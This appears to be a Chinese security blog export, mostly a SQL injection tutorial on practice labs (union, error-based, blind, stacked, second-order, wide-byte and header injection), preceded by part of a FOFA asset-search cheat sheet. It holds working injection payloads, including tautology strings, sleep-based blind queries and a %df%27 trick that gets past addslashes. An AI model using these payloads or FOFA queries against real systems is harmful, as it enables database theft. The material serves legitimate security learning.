<p>icon_hash&#x3D;”-247388890” 搜索使用此icon的资产。 仅限FOFA高级会员使用</p>
<p>host&#x3D;”.gov.cn” 从url中搜索”.gov.cn” 搜索要用host作为名称</p>
<p>port&#x3D;”6379” 查找对应“6379”端口的资产</p>
<p>icp&#x3D;”京ICP证030173号” 查找备案号为“京ICP证030173号”的网站 搜索网站类型资产</p>
<p>ip&#x3D;”1.1.1.1” 从ip中搜索包含“1.1.1.1”的网站 搜索要用ip作为名称</p>
<p>ip&#x3D;”220.181.111.1&#x2F;24” 查询IP为“220.181.111.1”的C网段资产</p>
<p>status_code&#x3D;”402” 查询服务器状态为“402”的资产</p>
<p>protocol&#x3D;”quic” 查询quic协议资产 搜索指定协议类型(在开启端口扫描的情况下有效)</p>
<p>country&#x3D;”CN” 搜索指定国家(编码)的资产。</p>
<p>region&#x3D;”HeNan” 搜索指定行政区的资产。</p>
<p>city&#x3D;”HanDan” 搜索指定城市的资产。</p>
<p>cert&#x3D;”baidu” 搜索证书(https或者imaps等)中带有baidu的资产。</p>
<p>cert.subject&#x3D;”Oracle Corporation” 搜索证书持有者是Oracle Corporation的资产</p>
<p>cert.issuer&#x3D;”DigiCert” 搜索证书颁发者为DigiCert Inc的资产</p>
<p>cert.is_valid&#x3D;true 验证证书是否有效，true有效，false无效，仅限FOFA高级会员使用</p>
<p>banner&#x3D;users &amp;&amp; protocol&#x3D;ftp 搜索FTP协议中带有users文本的资产。</p>
<p>type&#x3D;service 搜索所有协议资产，支持subdomain和service两种。</p>
<p>os&#x3D;”centos” 搜索操作系统为CentOS资产。</p>
<p>server&#x3D;&#x3D;”Microsoft-IIS&#x2F;10” 搜索IIS 10服务器。</p>
<p>app&#x3D;”Microsoft-Exchange” 搜索Microsoft-Exchange设备</p>
<p>after&#x3D;”2017” &amp;&amp; before&#x3D;”2017-10-01” 时间范围段搜索</p>
<p>asn&#x3D;”19551” 搜索指定asn的资产。</p>
<p>org&#x3D;”Amazon.com, Inc.” 搜索指定org(组织)的资产。</p>
<p>base_protocol&#x3D;”udp” 搜索指定udp协议的资产。</p>
<p>is_fraud&#x3D;false 排除仿冒&#x2F;欺诈数据</p>
<p>is_honeypot&#x3D;false 排除蜜罐数据，仅限FOFA高级会员使用</p>
<p>is_ipv6&#x3D;true 搜索ipv6的资产,只接受true和false。</p>
<p>is_domain&#x3D;true 搜索域名的资产,只接受true和false。</p>
<p>port_size&#x3D;”6” 查询开放端口数量等于”6”的资产，仅限FOFA会员使用</p>
<p>port_size_gt&#x3D;”6” 查询开放端口数量大于”6”的资产，仅限FOFA会员使用</p>
<p>port_size_lt&#x3D;”12” 查询开放端口数量小于”12”的资产，仅限FOFA会员使用</p>
<p>ip_ports&#x3D;”80,161” 搜索同时开放80和161端口的ip资产(以ip为单位的资产数据)</p>
<p>ip_country&#x3D;”CN” 搜索中国的ip资产(以ip为单位的资产数据)。</p>
<p>ip_region&#x3D;”Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。</p>
<p>ip_city&#x3D;”Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。</p>
<p>ip_after&#x3D;”2021-03-18” 搜索2021-03-18以后的ip资产(以ip为单位的资产数据)。</p>
<p>ip_before&#x3D;”2019-09-09” 搜索2019-09-09以前的ip资产(以ip为单位的资产数据)。</p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>info</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入 二开desu</title>
    <url>/2024/07/08/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1><span id="sql注入二开">SQL注入二开</span></h1><p>本教程基于SQL i-Labs,pikachu,dvwa等靶场做拓展</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240717192304556.png" alt="image-20240717192304556"></p>
<h1><span id="基本原理和概念简介">基本原理和概念简介</span></h1><p>SQL注入是黑客攻击最常见的方法，SQL注入作为OWASP中四大Web应用程序十大安全漏洞之一，也可以被一些没有太多网络安全技术“脚本小子”利用，因此掌握SQL注入原理和预防机制非常重要</p>
<h1><span id="how-to-build-sqli-lab">HOW to build SQLI-Lab</span></h1><h3><span id="简单的部署">简单的部署</span></h3><p>图方便的话 直接通过Docker部署就可以了</p>
<p>也可以部署在Web应用系统平台，</p>
<h3><span id="从0开始部署">从０开始部署</span></h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708172147084.png" alt="image-20240708172147084"></p>
<h3><span id="web应用程序系统">Web应用程序系统</span></h3><p>Web应用程序系统的总体体系结构如图一所示</p>
<p>客户端是浏览器，服务端通常包括了Web服务器，数据库服务器和高级语言解释器，典型的Web服务器架构包括</p>
<p>Apache+PHP+MySQL</p>
<p>IIS＋ASP+MYSQL等</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708171810391.png" alt="image-20240708171810391"></p>
<h1><span id="how-does-it-form-sql-injection">HOW does it form –SQL INJECTION</span></h1><p>SQL注入本质是攻击者在Web表单或者URL中插入SQL命令或者片段到查询字符串中,当Web服务器没有严格验证输入和传递字符串的有效性时,攻击者就可以达到<strong>欺骗数据库服务器</strong>,执行恶意SQL命令的效果</p>
<p>在此之前还要了解一个概念**’隐式转换’**</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708173609585.png" alt="image-20240708173609585"></p>
<h1><span id="sql-injection-list">SQL INJECTION LIST</span></h1><p>包括了</p>
<p>同义SQL注入,联合注入,基于报错的注入,盲注.</p>
<h4><span id="tautologic-sql注入真理sql">Tautologic SQL注入(真理SQL)</span></h4><p>这是一种简单的攻击方法,在系统原SQL命令中插入了一个tautologic(常为正确的)条件子句,使原SQL语句的条件限定不起作用.</p>
<h4><span id="联合sql注入">联合SQL注入</span></h4><p>本质上利用了SQL命令中的联合查询,从而可以执行插入的查询,从特定的数据表中窃取信息</p>
<p>建议在此之前 先学会基本的SQL注入的增删改查,并清除SQL库表的结构如何</p>
<h4><span id="基于报错的sql注入">基于报错的SQL注入</span></h4><p>攻击者将格式错误的SQL命令作为攻击负载使系统返回一些报错,从而使系统返回一些过度暗示的信息</p>
<p>比如说Order by 1—–n(列溢出报错)</p>
<h4><span id="盲注">盲注</span></h4><p>对于盲注攻击,攻击者会构造一些SQL查询条件,系统对这些查询条件的不同状态会有不同响应,进而获得系统的内部信息</p>
<h1><span id="sql-injection-begin">SQL injection Begin</span></h1><h2><span id="数字型最基本的检验">数字型—最基本的检验</span></h2><p>数字型可以检验程序本身是否有对用户的输入做任何的额外处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------------测试步骤-----------------------</span><br><span class="line">1.加单引号</span><br><span class="line">URL:www.text.com/text.php?id=1&#x27;]</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1&#x27;</span><br><span class="line">这时SQL语句出错，程序无法从数据库中查询出数据，此时可以判断出大概率存在注入，因为只有服务器将对应的单引号一起当作SQL语句执行了才会出现报错，但这也并不绝对，也有可能是程序本身的问题</span><br><span class="line">2.加 and 1=1</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=1</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1 and 1=1</span><br><span class="line">这时语句执行一定是正常的，因为加入了tautologic式的条件子句</span><br><span class="line">3.加 and 1=2</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=2</span><br><span class="line">对应数据服务器响应的SQL命令</span><br><span class="line">select * from table where id =1 and 1=2</span><br><span class="line">这时语句可以正常执行但无法查询出任何结构，返回数据与原始网页会存在一定的差异</span><br></pre></td></tr></table></figure>

<p>如果这三个payload传入过后同上述代码块中提出的响应是一致的，那么程序本身就是并没有对用户的输入做任何额外处理的，则可以判断该URL存在数字型注入</p>
<h2><span id="字符型">字符型</span></h2><p>当传入的参数类型为字符串时，若存在漏洞则称为字符型漏洞，字符型和数字型最大的一个区别在于数字型不需要单引号来闭合而字符串一般需要单引号来闭合对应传入的参数</p>
<p>字符型语句如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where id = ‘admin’</span><br></pre></td></tr></table></figure>

<p>因此在构造payload时通过闭合单引号可以成功执行语句</p>
<p>比方</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708200640557.png" alt="image-20240708200640557"></p>
<p>–为什么要这么做</p>
<p>首先服务端要求我们传入的参数是字符型 在传入的过程中需要将我们自己的恶意指令注入就需要首先满足隐式转换的条件–即先让它接收到需要的字符型变量，然后再通过一些条件子句代入我们自己的语句</p>
<p>也就是说 我们可以这么做</p>
<p>原本的查询语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27;（用户输入点）&#x27;+后续语句</span><br></pre></td></tr></table></figure>

<p>这个时候我们在输入点输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<p>那么可以如此合成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name =&#x27; 1&#x27; or 1=1 #&#x27;+后续语句</span><br></pre></td></tr></table></figure>

<p>可以发现不但闭合了前面的语句，同时通过条件语句插入了攻击者的语句，并注释（使无效化）后面可能会出现的另外一些条件语句。</p>
<p>可以用一句话很优雅的总结数字型和字符型</p>
<p>​                              <strong>—猎人往往以猎物的方式出现—</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708201225404.png" alt="image-20240708201225404"></p>
<h2><span id="union注入">Union注入</span></h2><p>联合查询可以一句SQL语句中执行多个查询任务，把查询任务从一个表追加到另外一个表，使用UNION或者UNION　ALL来实现</p>
<p>UNION ALL和UNION的区别是UNION ALL操作符可以查询重复的值</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708202413083.png" alt="image-20240708202413083"></p>
<p>使用UNION注入也是有前提条件的,Union all左右两边查询的列数必须一致</p>
<p>以上图为例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> user_id,first_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> user_id,first_name,last_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这个时候你可以发现,union all操作符前的sql语句查询了users表中user_id&#x3D;1所对应的user_id列和first_name.而在union操作符后的sql语句则不同,其对应多查询了一个last_name参数，这个时候查询语句不成立。</p>
<h3><span id="怎么确定字段数">怎么确定字段数</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># by2时回显正常</span><br><span class="line">order by 2#</span><br><span class="line"># by3时回显异常</span><br><span class="line">order by 3#</span><br></pre></td></tr></table></figure>

<p>思考：<br>1.为什么用order by 可以证明前面语句查询了三列数据呢？<br>2.我们为什么要知道前面查询了多少语句呢？<br>解：<br>第一题：<br>首先我们要知道order by的作用：order by 简单的来说 就是对前面查询的数据进行分组，分组依据是前面查询的内容的属性。比如说前面查询的数据是甲、乙、丙，我们可以根据这三种属性的一到三种进行分类，但是不能超过三种。所以上面order by 4 会报错误信息。因此可以依据此来判断前面查询了几列数据。<br>第二题：<br>因为使用union函数进行查询时，union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样，所以我们必需要知道前面语句查询了多少个元素。比如，此语句：select 甲,乙,丙 union select 1,2,3 因为前面查询的语句有三个元素（甲，乙，丙），所以后面查询的语句必须是三个元素（1，2，3）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709100240768.png" alt="image-20240709100240768"></p>
<p>类似上图所说的 我们就可以通过联合查询得到一些关键性的信息</p>
<p>这里我们也可以介绍一个比较重要的知识点，在MYSQL５.０以上版本，存在一个自带的数据库:information_schema(重点)</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709101446333.png" alt="image-20240709101446333"></p>
<p>information_schema数据库中还要三个表非常重要：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMATA:　表里包含所有数据库的名字</span><br><span class="line">TABLES：　　表里包含所有数据库的所有表</span><br><span class="line">COLUMNS：　　表里包含所有数据库的所有表的所有字段</span><br></pre></td></tr></table></figure>

<p>联合注入的过程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">１.判断是否存在注入，注入是字符型还是整数型</span><br><span class="line">２.猜解SQL查询语句中的字段数（ｏｒｄｅｒ　ｂｙ）</span><br><span class="line">３.确定显示位</span><br><span class="line">４.获取当前数据库（爆库</span><br><span class="line">５.获取数据库中的表（爆表</span><br><span class="line">６.获取表中的字段名（爆字段</span><br><span class="line">７.下载数据（爆数据</span><br><span class="line">这里以Pikachu联系平台为例</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110242890.png" alt="image-20240709110242890"></p>
<p>这里截取一个基本的流程 以DVWA靶场为例</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110813626.png" alt="image-20240709110813626"></p>
<p>一般爆出的密码是经过一层加密的,这个时候可以利用在线工具对应解码爆出真实的密码</p>
<p>这里附上在线工具</p>
<p><a href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
<h2><span id="报错注入">报错注入</span></h2><p>报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点，如果不符合数据库语法规则就会 报错并返回错误信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常用的特殊字符：&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>

<p>在MySQL高版本中添加了对XML文档进行查询和修改的函数,这两个函数常用于报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br></pre></td></tr></table></figure>

<p>原因:当这两个函数在执行时,如果出现XML文档路径错误就会产生报错.</p>
<h3><span id="extractvalue">extractvalue()</span></h3><ul>
<li>此函数从目标XML中返回包含所查询值的字符串,语法:extractvalue(XML_document,xpath_string)</li>
</ul>
<p>第一个参数:</p>
<p>string格式,即XNL文档对象名称</p>
<p>第二个参数:Xpath_string(Xpath形式的字符串,为XML文档的路径)</p>
<p>extractvalue使用时若Xpath_string格式出错,mysql数据库服务器是会爆出错误的,<strong>对应的报错也会很明显的给我们指出错误类型为xpath语法错误</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709151441863.png" alt="image-20240709151441863"></p>
<p>extractvalue原本是用于从documentr返回包含string的字符串,那么string参数不符合xpath的语法就会爆出错误,将查询结果同步放在信息里.<strong>这本质上也是利用了该函数报错的危险特性,将我们想要查询的结果以非xpath语法格式强行放入该函数,”勒令”它帮我们查询需要的信息</strong></p>
<h4><span id="-这里突然插入-sql注入的基本思路-">-这里突然插入  SQL注入的基本思路-</span></h4><p>SQL注入本质上其实也都明白了,就是利用现成的服务端给我们预留的查询语句进而实现从无关紧要的信息越位到更为重要更为核心的信息</p>
<p><strong>那么首先我们要搞懂的就是该如何利用这条服务端留给我们的现成的语句了</strong></p>
<p>其实道理很简单:</p>
<p>一,先搞清楚服务端目前供给我们来查询的是什么</p>
<p>那么这个时候就是可以通过思考SQL典型的树状结构,一步一步爆出我们想要的东西</p>
<p>SQL经典结构:   库(schema)–&gt;表(tables)—&gt;字段(column)</p>
<p>从这些最基本的出发,我们可以逐步摸清并加以利用,实现从边缘信息到重要信息的爬取</p>
<h4><span id="注入思路实践简述">注入思路实践简述</span></h4><p><strong>爆库名</strong>–&gt;<strong>爆表数</strong>–&gt;<strong>爆表名</strong>–&gt;<strong>爆列名</strong>–&gt;<strong>获得用户名和密码</strong></p>
<p>那么这里开始利用extractvalue()做一些经典的操作(doge)</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192227234.png" alt="image-20240709192227234"></p>
<h3><span id="updatexml函数">updatexml()函数</span></h3><p>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</p>
<p>作用:该百年文档中符合条件的节点的值</p>
<p>语法:</p>
<p>update(XML_document, xpath_string, new_value)</p>
<p>第一个参数;string格式,为XML文档对象的名称</p>
<p>第二个参数:代表路径,xpath形式的字符串例如&#x2F;title</p>
<p>第三个参数:string格式,替换查找到的符合条件的数据</p>
<p>updatexml使用同extractvalue()函数,都是当出现错误时爆出错误信息,并弹出对应的暗示信息,这个就没什么好说的了,直接截图套路即可,自行copy即可(doge)</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192932960.png" alt="image-20240709192932960"></p>
<p>其实本质很简单,只是单纯的用两个0x7e占位罢了</p>
<h2><span id="盲注">盲注</span></h2><h3><span id="布尔盲注">布尔盲注</span></h3><p>盲注顾名思义,就是一抹黑,无回显无报错的查询.</p>
<h4><span id="1只能判断是否存在注入和注入的类型">1.只能判断是否存在注入和注入的类型</span></h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193722352.png" alt="image-20240709193722352"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193749808.png" alt="image-20240709193749808"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193815739.png" alt="image-20240709193815739"></p>
<p>由图可知,对应的盲注就是像上面这样只有两种反馈信息,要么就是查询到了,要么就是查询不到,那么我们该怎么判断是否成功注入了呢?那么就要推翻我们只能从查询信息和报错信息中汲取攻击面的固有思维,从别的方面深入,一击毙命.</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709194633365.png" alt="image-20240709194633365"></p>
<p>这里以pikachu靶场中的盲注题型为例,假设一开始我们已知用户vince,想爆出他们的密码</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="center">构造ID取值</th>
<th align="center">反馈</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">vince</td>
<td align="center">存在信息回显</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">‘</td>
<td align="center">不存在信息回显</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">vince’ and 1&#x3D;1#</td>
<td align="center">存在信息回显</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">vince’ and 1&#x3D;2#</td>
<td align="center">不存在信息回显</td>
</tr>
</tbody></table>
<p>由条件3和4的构造真假返回对应不同的结果,可知存在SQL注入漏洞</p>
<p>不过只能知道存在是不够的,要加以利用才是硬道理</p>
<h4><span id="2猜解当前数据库名称">2.猜解当前数据库名称</span></h4><h5><span id="1猜解数据库名称长度二分法">1)猜解数据库名称长度(二分法)</span></h5><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709195523654.png" alt="image-20240709195523654"></p>
<h5><span id="2判断数据库名称的字符组成元素">2）判断数据库名称的字符组成元素</span></h5><p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个 位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后 逐个击破。</p>
<p><a href="https://www.sojson.com/asciitable.html">ASCII码对照表|ASCII编码 (sojson.com)</a></p>
<h5><span id="substr的用法">substr的用法</span></h5><p>substr在这里主要用作将字符串中单单一个字符截取出来,后续我们使用ascil函数与二分法逐步迭代出我们需要的数字</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200603601.png" alt="image-20240709200603601"></p>
<h5><span id="猜解数据库中的表名">猜解数据库中的表名</span></h5><p><strong>猜解表的个数</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200545105.png" alt="image-20240709200545105"></p>
<p><strong>猜解表名–从长度到具体的字符组成</strong></p>
<p>这里是猜解长度</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200844644.png" alt="image-20240709200844644"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201142364.png" alt="image-20240709201142364"></p>
<p>剩下的字段名字段值不过多赘述,流程是一致的</p>
<p>最后如果密码有经过某些解密方法那么为只需要重新带回就好了.最后验证一下字段的有效性就可以了</p>
<p>最后在这里想说的是 手工爆破的工作量是很大的,可以尝试学习python自动化脚本精简掉大部分的内容</p>
<h3><span id="时间盲注">时间盲注</span></h3><p>倘若界面返回值只有一种True,无论输入任何值,返回情况都会按正常来处理,加入特定的时间函数,通过查看WEB页面返回的时间差来判断注入的语句是否正确.</p>
<h4><span id="猜解数据库的名称">猜解数据库的名称</span></h4><p>其实本质上和布尔盲注的区别就在于, 它将返回信息转化成了响应时间上的区别,若判断条件为真,则执行sleep(n)函数,达到正常响应时间短基础上再延迟相应时间n瞄的效果;若判断条件为假则返回设置的1,此时不执行sleep(n)函数</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(length(database())=4,sleep(5),1);#</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(5),1);#</span><br></pre></td></tr></table></figure>

<h3><span id="总结">总结</span></h3><p>盲注需要这样集中函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length（） 返回字符串的长度</span><br><span class="line">substr（） 截取字符串</span><br><span class="line">ascil（） 返回字符对应的ASCII码</span><br><span class="line">sleep（） 将程序挂起一段时间</span><br></pre></td></tr></table></figure>

<h2><span id="堆叠查询注入">堆叠查询注入</span></h2><p>堆叠注入，从名词的含义就可以看到应该是<strong>一堆 sql 语句（多条）一起执行，而在真实的运用中也是这样的</strong>。我们知道在Mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束，<strong>这样我们就想到了是 不是可以多句一起使用。</strong>其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后 面再输入的就是一个全新的SQL语句，这个时候使用增删改查毫无限制</p>
<p>堆叠注入的使用条件是十分有限的,极有可能收到API或者数据库引擎,又或者权限的限制,只有当调用数据库函数支持执行多条SQL语句时才能使用,</p>
<p>利用mysqli_multi_query()函数就支持多条SQL语句同时执行，但实际情况中，如PHP为了防止所谓的SQL注入机制，调用数据库的函数往往都只是mysqli_query()函数,只能执行一条语句,所以说堆叠注入的使用条件是十分有限的且实战中很少会有这种啥防护器也不上的网页()</p>
<p>因此SQL注入分类总结可以如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据查询字段：数字型，字符型</span><br><span class="line">2.根据查询方式：Union注入、堆叠注入</span><br><span class="line">3.根据回显：报错、盲注</span><br></pre></td></tr></table></figure>

<h2><span id="二次注入">二次注入</span></h2><p>二次注入是指存入存出的过程中,存入数据库的时候做了过滤但是去取出来的时候没有做过滤z,而产生的数据库注入.</p>
<h3><span id="插入恶意数据">插入恶意数据</span></h3><p>在第一次想数据库插入数据时,使用addslashes对其中的特殊字符进行转义,但是addslashes函数有一个特点;虽然参数过滤后添加\进行转义,但是\并不会插入到数据库中,写入时还是保留了原来的数据.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在MySQL中，反斜线在字符串中属于是转义字符，经过语法解析器解析时会进行一次转义，所以当我们插入反斜线也就是通过insert“\”时，如insert “\”在数据库中只会存储“”，第一个反斜线（\)被当作转义字符处理</span><br></pre></td></tr></table></figure>

<h3><span id="引用恶意数据">引用恶意数据</span></h3><p>在将数据存入到数据库中之后,开发者就认为数据可信了.在下一次进行需要进行查询的时候,直接从数据库中取出了脏数据,没有进行进一步的检验和处理,这样就会造成SQL的二次注入</p>
<p><strong>比如第一次插入数据的时候,数据中带有单引号,直接插入到了数据库中–然后下一次使用在拼凑的过程中就形成了二次注入.</strong></p>
<p>二次注入漏洞原理示意图</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709214142033.png" alt="image-20240709214142033"></p>
<h2><span id="宽字节注入">宽字节注入</span></h2><h3><span id="宽字节概念">宽字节概念</span></h3><p>1、如果一个字符的大小是一个字节的，称为窄字节；</p>
<p> 2、如果一个字符的大小是两个及以上字节的，称为宽字节； 像GB2312、GBK、GB18030、BIG5、Shift_JIS等编码都是常见的宽字节字符集。 英文默认占一个字节，中文占两个字节。</p>
<h3><span id="宽字节注入原理">宽字节注入原理</span></h3><p>宽字节注入利用给MYSQL的一个特性,利用GBK编码的时候,会认为两个字符是一个汉字,为了防止网站被SQL注入,网站开发人员自然也会做一些防护,最基础的就是对一些特殊字符进行转义</p>
<p><strong>统筹前面学习的内容,可以发现SQL注入最关键的一步就是让引号闭合和跳出引号,如果无法跳出引号,那么输入的内容就永远在引号里,即永远是字符串,无法实现SQL注入</strong></p>
<p>网站开发者也想到了这一步,于是他们痛定思痛开始进步,从最简单的一个措施开始做起:<strong>转义</strong>—<strong>对输入的敏感内容、特殊字符进行转换，比方将引号替换为null</strong></p>
<h4><span id="addslashes函数">addslashes（）函数</span></h4><p>1、该函数会在预定义字符之前添加反斜线进行转义，<br>2、预定义字符一般有：单引号 双引号 反斜线 null</p>
<p>所谓的转义就是将预定义字符加上反斜线，使其失去占位构造语句的作用，使预定义字符仅仅是一个普通的字符串</p>
<p><strong>以pikachu数据库中的member表为例：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709220531493.png" alt="image-20240709220531493"></p>
<p>通过前面的SQL注入实验可以发现，字符型的注入点都是通过单引号闭合前后的反馈来判断的，但遇到addslashes（）函数时，单引号会被转义，导致我们用来判断注入点的单引号失效，所以我们的目的就是使转义符\失效，使单引号逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）kobe%df&#x27; or 1=1# //用户在前端输入</span><br><span class="line">2）kobe%df\&#x27; or 1=1# //addslashes()函数对用户输入进行检测，在单引号前面添加转义符</span><br><span class="line">\</span><br><span class="line">kobe%df%5c%27 or 1=1# //转义符 \ 编码成为%5c</span><br><span class="line">%df%5c = 運 //到达数据库，GBK编码</span><br><span class="line">3)kobe運&#x27; or 1=1#</span><br><span class="line">select id,email from member where username=&#x27;kobe運&#x27; or 1=1#&#x27; //从单引号中逃逸出来</span><br></pre></td></tr></table></figure>

<p>[GBK 编码范围, GBK 编码表 (qqxiuzi.cn)](<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK%E7%BC%96%E7%A0%81%EF%BC%8C%E6%98%AF%E5%AF%B9GB2312%E7%BC%96%E7%A0%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%AE%8C%E5%85%A8%E5%85%BC%E5%AE%B9GB2312-80%E6%A0%87%E5%87%86%E3%80%82,GBK%E7%BC%96%E7%A0%81%E4%BE%9D%E7%84%B6%E9%87%87%E7%94%A8%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88%EF%BC%8C%E5%85%B6%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4%EF%BC%9A8140%EF%BC%8DFEFE%EF%BC%8C%E5%89%94%E9%99%A4xx7F%E7%A0%81%E4%BD%8D%EF%BC%8C%E5%85%B123940%E4%B8%AA%E7%A0%81%E4%BD%8D%E3%80%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK编码，是对GB2312编码的扩展，因此完全兼容GB2312-80标准。,GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。</a> 共收录汉字和图形符号21886个，其中汉字（包括部首和构件）21003个，图形符号883个。)</p>
<p>原理：前端输入 %df%27 时首先经过 addslashes() 函数转义变成了 %df%5c%27 （ %5c 是反斜杠 \ )， 之后在数据库查询前因为设置了GBK编码，即在汉字编码范围内两个字节都会被重新编码为一个汉字。 然后MySQL服务器就会对查询语句进行GBK编码，即 %df%5c 转换成了汉字”運”，使得单引号成功逃 逸，进而实现SQL注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===&gt; addslashes函数 ===&gt; %df%5c%27 ===&gt; 数据库GBK ===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709224224722.png" alt="image-20240709224224722"></p>
<h2><span id="http-header-和-cookie注入">http header 和 cookie注入</span></h2><p>HTTP头注入其实并不是一个新的SQL注入类型,而是指出现SQL注入漏洞的场景,有些时候,后台开发人员为了验证客户端头信息(比如常用的cookie验证),或者通过http header头信息获取客户端的一些资料–比如useragent、acceept字段等，会获取客户端的http header字段内容并用SQL进行处理，如果没有足够的安全检验则会导致对应的SQL注入漏洞。</p>
<p>进入pikachu的http header来进行一下测试:</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225102261.png" alt="image-20240709225102261"></p>
<p>通过提示 ，我们通过基本的admin&#x2F;123456登录，并获得下列信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225244173.png" alt="image-20240709225244173"></p>
